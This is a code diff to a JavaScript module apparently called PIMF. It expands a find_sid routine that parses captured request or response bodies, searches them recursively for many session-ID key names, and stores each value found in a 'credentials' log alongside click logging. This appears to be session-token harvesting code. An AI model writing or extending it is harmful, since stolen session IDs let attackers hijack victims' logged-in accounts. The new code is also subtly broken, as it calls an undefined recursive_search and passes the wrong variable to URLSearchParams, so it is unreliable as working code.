@@ -15,7 +15,7 @@ const Q = ( function(){
 
     const
         api_name = "PIMF",
-        version  = "1.44",
+        version  = "1.45",
         config   = {
             gui:null,
             txt:null,
@@ -136,26 +136,34 @@ const Q = ( function(){
         array.push( element );
         return true;
     }
-    function find_sid( txt ){
-        let needles = [
-                "session_id",
-                "sid","SID",
-                "sessionID",
-                "session\":{\"id\":",
-                "sessid","sessId","sesid","sesId" ];
-        for ( let n in needles ){
-            let xp = txt.split( "\"" + n + "\":" );
-            if ( xp.length > 1 ){
-                let sid = xp[1];
-                if ( sid[0] == "\"" ) sid = sid.slice(1);
-                len = Math.min( sid.split( "\"" )[0].length,
-                                sid.split( "," )[0].length,
-                                sid.split( "=" )[0].length,
-                                sid.split( "}" )[0].length );
-                sid = sid.slice( 0, len );
-                Q.data.log.credentials.session_ids.push( sid.toString() );
+    function recursive_search_by_keys( needles, data, callback ){
+        for ( let key in data ){
+            let p = data[ key ];
+            if ( typeof( p ) == "object" ){
+                recursive_search( p );
+            }
+            if ( needles.includes( key ) ){
+                callback( p );
             }
         }
+    }
+    function find_sid( body_txt ){
+        let needles = [
+                "session_id","session-id",
+                "SESS_ID","SESSION_ID","SESSION-ID",
+                "sid","SID",
+                "sessionID","sessionId",
+                "sessid","sessId","sesid","sesId",
+                "sessID","sesID" ],
+            data = null;
+        try {
+            data = JSON.parse( body_txt );
+        } catch(e){
+            data = new URLSearchParams( data );
+        }
+        recursive_search_by_keys( needles, data, (sid)=>{
+            Q.data.log.credentials.session_ids.push( sid.toString() );
+        } );
     }
 
     function _log_click( e ){
